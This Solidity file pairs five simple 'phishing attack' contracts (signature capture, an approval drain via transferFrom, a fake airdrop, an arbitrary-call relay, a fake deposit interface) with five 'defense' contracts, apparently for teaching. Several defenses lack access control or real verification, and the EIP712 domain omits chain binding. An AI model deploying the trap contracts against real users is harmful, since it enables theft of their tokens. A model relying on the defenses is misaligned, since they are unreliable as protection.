// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/* ========== PHISHING ATTACKS ========== */

// 1️⃣ Signature Phishing
contract PhishingSigTrap {
    event SigTrap(bytes32 hash, bytes sig);

    function fakeSign(bytes32 h, bytes calldata sig) external {
        emit SigTrap(h, sig);
    }
}

// 2️⃣ Token Approval Trap
interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract ApprovalTrap {
    function drain(IERC20 token, address victim) external {
        token.transferFrom(victim, msg.sender, 100 ether); // Assume max approved
    }
}

// 3️⃣ Fake Airdrop Claim
contract FakeDrop {
    function claim() external payable {
        // No real reward, just tricks user into interacting
        require(msg.value == 0, "No ETH needed");
    }
}

// 4️⃣ Proxy Signature Phish
contract ProxySigForwarder {
    function relay(address target, bytes calldata sigPayload) external {
        (bool ok, ) = target.call(sigPayload);
        require(ok);
    }
}

// 5️⃣ Cloned Interface Trap
contract FakeInterface {
    event Received(address sender, uint256 value);

    function deposit() external payable {
        emit Received(msg.sender, msg.value); // no real logic
    }
}

/* ========== PHISHING DEFENSE CONTRACTS ========== */

// 🛡️ 1 EIP712 Signature Domain Lock
contract EIP712Verifier {
    bytes32 public domain;

    constructor(string memory name, string memory version) {
        domain = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version)"),
            keccak256(bytes(name)),
            keccak256(bytes(version))
        ));
    }

    function verify(bytes32 structHash, bytes memory sig) public view returns (address) {
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domain, structHash));
        (bytes32 r, bytes32 s, uint8 v) = abi.decode(sig, (bytes32, bytes32, uint8));
        return ecrecover(digest, v, r, s);
    }
}

// 🛡️ 2 ERC20 Approval Bound Checker
contract SafeApprover {
    function approveSafe(IERC20 token, address spender, uint256 amount) external {
        require(amount <= 100 ether, "Over-approval");
        token.approve(spender, amount);
    }
}

// 🛡️ 3 Trusted Drop List
contract DropVerifier {
    mapping(address => bool) public trustedDrop;

    function approveDrop(address d, bool yes) external {
        trustedDrop[d] = yes;
    }

    function claim(address drop) external {
        require(trustedDrop[drop], "Untrusted drop");
        (bool ok, ) = drop.call(abi.encodeWithSignature("claim()"));
        require(ok);
    }
}

// 🛡️ 4 Interface Hash Guard
contract InterfaceHash {
    bytes4 public expectedSelector;

    function setSelector(bytes4 s) external {
        expectedSelector = s;
    }

    fallback() external {
        require(msg.sig == expectedSelector, "Invalid interface");
    }
}

// 🛡️ 5 Proxy Sig Lock
contract SigLock {
    mapping(bytes32 => bool) public used;

    function check(bytes calldata sig, bytes32 hash) external {
        bytes32 combo = keccak256(abi.encodePacked(msg.sender, hash));
        require(!used[combo], "Used sig");
        used[combo] = true;
    }
}
